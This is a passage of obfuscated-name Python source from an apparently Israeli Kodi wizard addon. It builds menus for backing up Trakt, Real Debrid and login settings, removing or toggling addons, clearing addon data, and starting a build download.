	addFile ('%s שמירת חשבון סדרות Tv ו Apollo Group:  '%OO00OO00000OOOOO0 .replace ('true',O000O00OO00OO0O00 ).replace ('false',OO0OO000O00OO0OO0 ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3156
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%O0OOO00O0OO0OOOO0 .replace ('true',O000O00OO00OO0O00 ).replace ('false',OO0OO000O00OO0OO0 ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3159
	addFile ('%s שמירת נתיבי ספריות וידאו:  '%O00OO000OOOOOOOO0 .replace ('true',O000O00OO00OO0O00 ).replace ('false',OO0OO000O00OO0OO0 ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3160
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%O000OO0OOOOO0OOO0 .replace ('true',O000O00OO00OO0O00 ).replace ('false',OO0OO000O00OO0OO0 ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3161
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%O000000OO0O0O0000 .replace ('true',O000O00OO00OO0O00 ).replace ('false',OO0OO000O00OO0OO0 ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3163
	addFile ('%s שמירת פליליסט לאודר:  '%OO00OO0OOO0000OO0 .replace ('true',O000O00OO00OO0O00 ).replace ('false',OO0OO000O00OO0OO0 ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3164
	addFile ('%s שמירת הגדרות באפר: '%OOO0OOOO00O0OO00O .replace ('true',O000O00OO00OO0O00 ).replace ('false',OO0OO000O00OO0OO0 ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3169
	addFile ('%s שמירת רשימות ריפו:  '%O0O000OO0OO0000OO .replace ('true',O000O00OO00OO0O00 ).replace ('false',OO0OO000O00OO0OO0 ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3171
	setView ('files','viewType')#line:3173
def traktMenu ():#line:3175
	O0O0000O0OOOO0000 ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3176
	O000O0O0OOOO00OO0 =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3177
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3178
	addFile ('Save Trakt Data: %s'%O0O0000O0OOOO0000 ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3179
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (O000O0O0OOOO00OO0 ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3180
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3181
	for O0O0000O0OOOO0000 in traktit .ORDER :#line:3183
		O0O0000OOOO0OOOO0 =TRAKTID [O0O0000O0OOOO0000 ]['name']#line:3184
		O0OOOOO0O0OOO0O0O =TRAKTID [O0O0000O0OOOO0000 ]['path']#line:3185
		O0000000O00OOOOO0 =TRAKTID [O0O0000O0OOOO0000 ]['saved']#line:3186
		O00OO0O0O0OO00000 =TRAKTID [O0O0000O0OOOO0000 ]['file']#line:3187
		OO0O0OOOO0O00OO0O =wiz .getS (O0000000O00OOOOO0 )#line:3188
		OO0OOO0O0O0000OOO =traktit .traktUser (O0O0000O0OOOO0000 )#line:3189
		OO000O0OO0OO0OOO0 =TRAKTID [O0O0000O0OOOO0000 ]['icon']if os .path .exists (O0OOOOO0O0OOO0O0O )else ICONTRAKT #line:3190
		OOO0OO00OO000O0OO =TRAKTID [O0O0000O0OOOO0000 ]['fanart']if os .path .exists (O0OOOOO0O0OOO0O0O )else FANART #line:3191
		O00OOO00O00O0O00O =createMenu ('saveaddon','Trakt',O0O0000O0OOOO0000 )#line:3192
		OOO000000OO0O0OO0 =createMenu ('save','Trakt',O0O0000O0OOOO0000 )#line:3193
		O00OOO00O00O0O00O .append ((THEME2 %'%s Settings'%O0O0000OOOO0OOOO0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O0O0000O0OOOO0000 )))#line:3194
		addFile ('[+]-> %s'%O0O0000OOOO0OOOO0 ,'',icon =OO000O0OO0OO0OOO0 ,fanart =OOO0OO00OO000O0OO ,themeit =THEME3 )#line:3196
		if not os .path .exists (O0OOOOO0O0OOO0O0O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO000O0OO0OO0OOO0 ,fanart =OOO0OO00OO000O0OO ,menu =O00OOO00O00O0O00O )#line:3197
		elif not OO0OOO0O0O0000OOO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O0O0000O0OOOO0000 ,icon =OO000O0OO0OO0OOO0 ,fanart =OOO0OO00OO000O0OO ,menu =O00OOO00O00O0O00O )#line:3198
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO0OOO0O0O0000OOO ,'authtrakt',O0O0000O0OOOO0000 ,icon =OO000O0OO0OO0OOO0 ,fanart =OOO0OO00OO000O0OO ,menu =O00OOO00O00O0O00O )#line:3199
		if OO0O0OOOO0O00OO0O =="":#line:3200
			if os .path .exists (O00OO0O0O0OO00000 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O0O0000O0OOOO0000 ,icon =OO000O0OO0OO0OOO0 ,fanart =OOO0OO00OO000O0OO ,menu =OOO000000OO0O0OO0 )#line:3201
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O0O0000O0OOOO0000 ,icon =OO000O0OO0OO0OOO0 ,fanart =OOO0OO00OO000O0OO ,menu =OOO000000OO0O0OO0 )#line:3202
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO0O0OOOO0O00OO0O ,'',icon =OO000O0OO0OO0OOO0 ,fanart =OOO0OO00OO000O0OO ,menu =OOO000000OO0O0OO0 )#line:3203
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3205
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3206
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3207
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3208
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3209
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3210
	setView ('files','viewType')#line:3211
def realMenu ():#line:3213
	OOOO00OOO0O00O00O ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3214
	OO0O00O0O0O0OOO00 =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3215
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3216
	addFile ('Save Real Debrid Data: %s'%OOOO00OOO0O00O00O ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3217
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (OO0O00O0O0O0OOO00 ),'',icon =ICONREAL ,themeit =THEME3 )#line:3218
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3219
	for OOOO0OOO00O0000OO in debridit .ORDER :#line:3221
		OO0OOOOOOO000OO0O =DEBRIDID [OOOO0OOO00O0000OO ]['name']#line:3222
		O00OOOO0000O00OOO =DEBRIDID [OOOO0OOO00O0000OO ]['path']#line:3223
		O0000OOOOOOO000O0 =DEBRIDID [OOOO0OOO00O0000OO ]['saved']#line:3224
		OOO00O000O00O0O0O =DEBRIDID [OOOO0OOO00O0000OO ]['file']#line:3225
		O000000OOOOOO00O0 =wiz .getS (O0000OOOOOOO000O0 )#line:3226
		O000O00000OO00000 =debridit .debridUser (OOOO0OOO00O0000OO )#line:3227
		OOOOOO000000O00O0 =DEBRIDID [OOOO0OOO00O0000OO ]['icon']if os .path .exists (O00OOOO0000O00OOO )else ICONREAL #line:3228
		OOO0O00OOO00OOO00 =DEBRIDID [OOOO0OOO00O0000OO ]['fanart']if os .path .exists (O00OOOO0000O00OOO )else FANART #line:3229
		OO0O0O0OOO0OOO0O0 =createMenu ('saveaddon','Debrid',OOOO0OOO00O0000OO )#line:3230
		O0O0O000O0OOOO000 =createMenu ('save','Debrid',OOOO0OOO00O0000OO )#line:3231
		OO0O0O0OOO0OOO0O0 .append ((THEME2 %'%s Settings'%OO0OOOOOOO000OO0O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,OOOO0OOO00O0000OO )))#line:3232
		addFile ('[+]-> %s'%OO0OOOOOOO000OO0O ,'',icon =OOOOOO000000O00O0 ,fanart =OOO0O00OOO00OOO00 ,themeit =THEME3 )#line:3234
		if not os .path .exists (O00OOOO0000O00OOO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOOOOO000000O00O0 ,fanart =OOO0O00OOO00OOO00 ,menu =OO0O0O0OOO0OOO0O0 )#line:3235
		elif not O000O00000OO00000 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',OOOO0OOO00O0000OO ,icon =OOOOOO000000O00O0 ,fanart =OOO0O00OOO00OOO00 ,menu =OO0O0O0OOO0OOO0O0 )#line:3236
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O000O00000OO00000 ,'authdebrid',OOOO0OOO00O0000OO ,icon =OOOOOO000000O00O0 ,fanart =OOO0O00OOO00OOO00 ,menu =OO0O0O0OOO0OOO0O0 )#line:3237
		if O000000OOOOOO00O0 =="":#line:3238
			if os .path .exists (OOO00O000O00O0O0O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',OOOO0OOO00O0000OO ,icon =OOOOOO000000O00O0 ,fanart =OOO0O00OOO00OOO00 ,menu =O0O0O000O0OOOO000 )#line:3239
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',OOOO0OOO00O0000OO ,icon =OOOOOO000000O00O0 ,fanart =OOO0O00OOO00OOO00 ,menu =O0O0O000O0OOOO000 )#line:3240
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O000000OOOOOO00O0 ,'',icon =OOOOOO000000O00O0 ,fanart =OOO0O00OOO00OOO00 ,menu =O0O0O000O0OOOO000 )#line:3241
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3243
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3244
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3245
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3246
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3247
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3248
	setView ('files','viewType')#line:3249
def loginMenu ():#line:3251
	O0O00O00O0OO00O0O ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3252
	OOOOOO0O000O0OOOO =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3253
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3254
	addFile ('Save Login Data: %s'%O0O00O00O0OO00O0O ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3255
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (OOOOOO0O000O0OOOO ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3256
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3257
	for O0O00O00O0OO00O0O in loginit .ORDER :#line:3259
		OOOO0OOO0000O00O0 =LOGINID [O0O00O00O0OO00O0O ]['name']#line:3260
		O0O00OOO000OO00OO =LOGINID [O0O00O00O0OO00O0O ]['path']#line:3261
		O0O0OOO0000OOO00O =LOGINID [O0O00O00O0OO00O0O ]['saved']#line:3262
		O00O0OO0O0O0O0O00 =LOGINID [O0O00O00O0OO00O0O ]['file']#line:3263
		OO0OOOO000OO000OO =wiz .getS (O0O0OOO0000OOO00O )#line:3264
		O0OOO000O0O0000O0 =loginit .loginUser (O0O00O00O0OO00O0O )#line:3265
		O0OO0O0O00OO00OO0 =LOGINID [O0O00O00O0OO00O0O ]['icon']if os .path .exists (O0O00OOO000OO00OO )else ICONLOGIN #line:3266
		OO000000000OOO000 =LOGINID [O0O00O00O0OO00O0O ]['fanart']if os .path .exists (O0O00OOO000OO00OO )else FANART #line:3267
		OOO00O00OOO0000O0 =createMenu ('saveaddon','Login',O0O00O00O0OO00O0O )#line:3268
		O00O00O0O0O0O0000 =createMenu ('save','Login',O0O00O00O0OO00O0O )#line:3269
		OOO00O00OOO0000O0 .append ((THEME2 %'%s Settings'%OOOO0OOO0000O00O0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,O0O00O00O0OO00O0O )))#line:3270
		addFile ('[+]-> %s'%OOOO0OOO0000O00O0 ,'',icon =O0OO0O0O00OO00OO0 ,fanart =OO000000000OOO000 ,themeit =THEME3 )#line:3272
		if not os .path .exists (O0O00OOO000OO00OO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0OO0O0O00OO00OO0 ,fanart =OO000000000OOO000 ,menu =OOO00O00OOO0000O0 )#line:3273
		elif not O0OOO000O0O0000O0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',O0O00O00O0OO00O0O ,icon =O0OO0O0O00OO00OO0 ,fanart =OO000000000OOO000 ,menu =OOO00O00OOO0000O0 )#line:3274
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0OOO000O0O0000O0 ,'authlogin',O0O00O00O0OO00O0O ,icon =O0OO0O0O00OO00OO0 ,fanart =OO000000000OOO000 ,menu =OOO00O00OOO0000O0 )#line:3275
		if OO0OOOO000OO000OO =="":#line:3276
			if os .path .exists (O00O0OO0O0O0O0O00 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',O0O00O00O0OO00O0O ,icon =O0OO0O0O00OO00OO0 ,fanart =OO000000000OOO000 ,menu =O00O00O0O0O0O0000 )#line:3277
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',O0O00O00O0OO00O0O ,icon =O0OO0O0O00OO00OO0 ,fanart =OO000000000OOO000 ,menu =O00O00O0O0O0O0000 )#line:3278
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO0OOOO000OO000OO ,'',icon =O0OO0O0O00OO00OO0 ,fanart =OO000000000OOO000 ,menu =O00O00O0O0O0O0000 )#line:3279
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3281
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3282
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3283
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3284
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3285
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3286
	setView ('files','viewType')#line:3287
def fixUpdate ():#line:3289
	if KODIV <17 :#line:3290
		O000O0OO0O000000O =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3291
		try :#line:3292
			os .remove (O000O0OO0O000000O )#line:3293
		except Exception as O00OO00OOO00OOOO0 :#line:3294
			wiz .log ("Unable to remove %s, Purging DB"%O000O0OO0O000000O )#line:3295
			wiz .purgeDb (O000O0OO0O000000O )#line:3296
	else :#line:3297
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3298
def removeAddonMenu ():#line:3300
	OOO0O00O00O0000O0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3301
	OO0OOO00OOOOOOOOO =[];O00O0000OOO000O00 =[]#line:3302
	for O0OOO00O00OOO0000 in sorted (OOO0O00O00O0000O0 ,key =lambda OO0OOO00OO00OOO0O :OO0OOO00OO00OOO0O ):#line:3303
		O0OOOOOO0O0000O00 =os .path .split (O0OOO00O00OOO0000 [:-1 ])[1 ]#line:3304
		if O0OOOOOO0O0000O00 in EXCLUDES :continue #line:3305
		elif O0OOOOOO0O0000O00 in DEFAULTPLUGINS :continue #line:3306
		elif O0OOOOOO0O0000O00 =='packages':continue #line:3307
		O000000O0OO00O000 =os .path .join (O0OOO00O00OOO0000 ,'addon.xml')#line:3308
		if os .path .exists (O000000O0OO00O000 ):#line:3309
			O000OO00O0O0000O0 =open (O000000O0OO00O000 )#line:3310
			OOO0O00O000OOO0O0 =O000OO00O0O0000O0 .read ()#line:3311
			OO00O00O000O00OOO =wiz .parseDOM (OOO0O00O000OOO0O0 ,'addon',ret ='id')#line:3312
			O0OOO0OO0OO0000OO =O0OOOOOO0O0000O00 if len (OO00O00O000O00OOO )==0 else OO00O00O000O00OOO [0 ]#line:3314
			try :#line:3315
				O000O0O000000OOOO =xbmcaddon .Addon (id =O0OOO0OO0OO0000OO )#line:3316
				OO0OOO00OOOOOOOOO .append (O000O0O000000OOOO .getAddonInfo ('name'))#line:3317
				O00O0000OOO000O00 .append (O0OOO0OO0OO0000OO )#line:3318
			except :#line:3319
				pass #line:3320
	if len (OO0OOO00OOOOOOOOO )==0 :#line:3321
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3322
		return #line:3323
	if KODIV >16 :#line:3324
		O0000OOOO0O0O000O =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,OO0OOO00OOOOOOOOO )#line:3325
	else :#line:3326
		O0000OOOO0O0O000O =[];O00OO00O00OO00O00 =0 #line:3327
		O0OOO00OOOO00000O =["-- Click here to Continue --"]+OO0OOO00OOOOOOOOO #line:3328
		while not O00OO00O00OO00O00 ==-1 :#line:3329
			O00OO00O00OO00O00 =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,O0OOO00OOOO00000O )#line:3330
			if O00OO00O00OO00O00 ==-1 :break #line:3331
			elif O00OO00O00OO00O00 ==0 :break #line:3332
			else :#line:3333
				OOOO00O0OOO0OO000 =(O00OO00O00OO00O00 -1 )#line:3334
				if OOOO00O0OOO0OO000 in O0000OOOO0O0O000O :#line:3335
					O0000OOOO0O0O000O .remove (OOOO00O0OOO0OO000 )#line:3336
					O0OOO00OOOO00000O [O00OO00O00OO00O00 ]=OO0OOO00OOOOOOOOO [OOOO00O0OOO0OO000 ]#line:3337
				else :#line:3338
					O0000OOOO0O0O000O .append (OOOO00O0OOO0OO000 )#line:3339
					O0OOO00OOOO00000O [O00OO00O00OO00O00 ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OO0OOO00OOOOOOOOO [OOOO00O0OOO0OO000 ])#line:3340
	if O0000OOOO0O0O000O ==None :return #line:3341
	if len (O0000OOOO0O0O000O )>0 :#line:3342
		wiz .addonUpdates ('set')#line:3343
		for OOO0OO0O000O0OO0O in O0000OOOO0O0O000O :#line:3344
			removeAddon (O00O0000OOO000O00 [OOO0OO0O000O0OO0O ],OO0OOO00OOOOOOOOO [OOO0OO0O000O0OO0O ],True )#line:3345
		xbmc .sleep (1000 )#line:3347
		if INSTALLMETHOD ==1 :O00O0000O0O0OOO00 =1 #line:3349
		elif INSTALLMETHOD ==2 :O00O0000O0O0OOO00 =0 #line:3350
		else :O00O0000O0O0OOO00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3351
		if O00O0000O0O0OOO00 ==1 :wiz .reloadFix ('remove addon')#line:3352
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3353
def removeAddonDataMenu ():#line:3355
	if os .path .exists (ADDOND ):#line:3356
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3357
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3358
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3359
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3360
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3361
		OO000OO00O000O00O =glob .glob (os .path .join (ADDOND ,'*/'))#line:3362
		for O0O00OO0O0O0O0OOO in sorted (OO000OO00O000O00O ,key =lambda O0OOOO0OO0000OO0O :O0OOOO0OO0000OO0O ):#line:3363
			O000OOO000000OO0O =O0O00OO0O0O0O0OOO .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3364
			O0O00O0O0O0OOOO0O =os .path .join (O0O00OO0O0O0O0OOO .replace (ADDOND ,ADDONS ),'icon.png')#line:3365
			OO00O00O0O0OOOOOO =os .path .join (O0O00OO0O0O0O0OOO .replace (ADDOND ,ADDONS ),'fanart.png')#line:3366
			O0O000O0O0OO000OO =O000OOO000000OO0O #line:3367
			O0OO00O0OOO0O00OO ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3368
			for OOO0000OOO00000O0 in O0OO00O0OOO0O00OO :#line:3369
				O0O000O0O0OO000OO =O0O000O0O0OO000OO .replace (OOO0000OOO00000O0 ,O0OO00O0OOO0O00OO [OOO0000OOO00000O0 ])#line:3370
			if O000OOO000000OO0O in EXCLUDES :O0O000O0O0OO000OO ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%O0O000O0O0OO000OO #line:3371
			else :O0O000O0O0OO000OO ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%O0O000O0O0OO000OO #line:3372
			addFile (' %s'%O0O000O0O0OO000OO ,'removedata',O000OOO000000OO0O ,icon =O0O00O0O0O0OOOO0O ,fanart =OO00O00O0O0OOOOOO ,themeit =THEME2 )#line:3373
	else :#line:3374
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3375
	setView ('files','viewType')#line:3376
def enableAddons ():#line:3378
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3379
	OOO00O0O0OO0OOO00 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3380
	O000OO00OO0OO00O0 =0 #line:3381
	for OOOO000O00OO0000O in sorted (OOO00O0O0OO0OOO00 ,key =lambda OO00OOO000OO0OO00 :OO00OOO000OO0OO00 ):#line:3382
		OOO0000OOO0OOO000 =os .path .split (OOOO000O00OO0000O [:-1 ])[1 ]#line:3383
		if OOO0000OOO0OOO000 in EXCLUDES :continue #line:3384
		if OOO0000OOO0OOO000 in DEFAULTPLUGINS :continue #line:3385
		OO0O0OO000OOOO00O =os .path .join (OOOO000O00OO0000O ,'addon.xml')#line:3386
		if os .path .exists (OO0O0OO000OOOO00O ):#line:3387
			O000OO00OO0OO00O0 +=1 #line:3388
			OOO00O0O0OO0OOO00 =OOOO000O00OO0000O .replace (ADDONS ,'')[1 :-1 ]#line:3389
			O00OO00O00O000000 =open (OO0O0OO000OOOO00O )#line:3390
			O00O00O000OOOO0OO =O00OO00O00O000000 .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3391
			OOO00O00OOOO00000 =wiz .parseDOM (O00O00O000OOOO0OO ,'addon',ret ='id')#line:3392
			O00O0OOO00O0O000O =wiz .parseDOM (O00O00O000OOOO0OO ,'addon',ret ='name')#line:3393
			try :#line:3394
				OOOO00OOOOOO000O0 =OOO00O00OOOO00000 [0 ]#line:3395
				OOOOO0OOOO0000OOO =O00O0OOO00O0O000O [0 ]#line:3396
			except :#line:3397
				continue #line:3398
			try :#line:3399
				OO0O0000O00OO00OO =xbmcaddon .Addon (id =OOOO00OOOOOO000O0 )#line:3400
				O0O00O0O000OO0OO0 ="[COLOR green][Enabled][/COLOR]"#line:3401
				OO0O0O0OO00O0OO0O ="false"#line:3402
			except :#line:3403
				O0O00O0O000OO0OO0 ="[COLOR red][Disabled][/COLOR]"#line:3404
				OO0O0O0OO00O0OO0O ="true"#line:3405
				pass #line:3406
			O00O0OO0OOO000O00 =os .path .join (OOOO000O00OO0000O ,'icon.png')if os .path .exists (os .path .join (OOOO000O00OO0000O ,'icon.png'))else ICON #line:3407
			OO00O00OO0OOO0000 =os .path .join (OOOO000O00OO0000O ,'fanart.jpg')if os .path .exists (os .path .join (OOOO000O00OO0000O ,'fanart.jpg'))else FANART #line:3408
			addFile ("%s %s"%(O0O00O0O000OO0OO0 ,OOOOO0OOOO0000OOO ),'toggleaddon',OOO00O0O0OO0OOO00 ,OO0O0O0OO00O0OO0O ,icon =O00O0OO0OOO000O00 ,fanart =OO00O00OO0OOO0000 )#line:3409
			O00OO00O00O000000 .close ()#line:3410
	if O000OO00OO0OO00O0 ==0 :#line:3411
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3412
	setView ('files','viewType')#line:3413
def changeFeq ():#line:3415
	OO0OOO00000O000O0 =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3416
	O0OOO0OOOO00O0OOO =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,OO0OOO00000O000O0 )#line:3417
	if not O0OOO0OOOO00O0OOO ==-1 :#line:3418
		wiz .setS ('autocleanfeq',str (O0OOO0OOOO00O0OOO ))#line:3419
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,OO0OOO00000O000O0 [O0OOO0OOOO00O0OOO ]))#line:3420
def developer ():#line:3422
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3423
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3424
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3425
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3426
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3427
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3428
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3429
	setView ('files','viewType')#line:3431
def download (OOO0OOO0O00OOO0O0 ,O00000O00O0O0OO0O ):#line:3436
  O0O000O00000O0OO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3437
  OOO0OO0O0O00OOOOO =xbmcgui .DialogProgress ()#line:3438
  OOO0OO0O0O00OOOOO .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3439
  OOO0O00OO0000O0O0 =os .path .join (O0O000O00000O0OO0 ,'isr.zip')#line:3440
  OOOOO000O00OOO0O0 =urllib2 .Request (OOO0OOO0O00OOO0O0 )#line:3441
  O00000OO000OO0OOO =urllib2 .urlopen (OOOOO000O00OOO0O0 )#line:3442
  OOO00O0O00000O00O =xbmcgui .DialogProgress ()#line:3444
  OOO00O0O00000O00O .create ("Downloading","Downloading "+name )#line:3445
  OOO00O0O00000O00O .update (0 )#line:3446
  O0O0O00O000O00OOO =O00000O00O0O0OO0O #line:3447
  O00OO0O0O00OO0OOO =open (OOO0O00OO0000O0O0 ,'wb')#line:3448
  try :#line:3450
    OOOOO00OO0O000000 =O00000OO000OO0OOO .info ().getheader ('Content-Length').strip ()#line:3451
    O00O00OOO0OOOOOO0 =True #line:3452
  except AttributeError :#line:3453
        O00O00OOO0OOOOOO0 =False #line:3454
  if O00O00OOO0OOOOOO0 :#line:3456
        OOOOO00OO0O000000 =int (OOOOO00OO0O000000 )#line:3457
  OOOO0O0000OO00OOO =0 #line:3459
  OOO00OOOOO0O000OO =time .time ()#line:3460
  while True :#line:3461
        OO000OOO0OOOOOO00 =O00000OO000OO0OOO .read (8192 )#line:3462
        if not OO000OOO0OOOOOO00 :#line:3463
            sys .stdout .write ('\n')#line:3464
            break #line:3465
        OOOO0O0000OO00OOO +=len (OO000OOO0OOOOOO00 )#line:3467
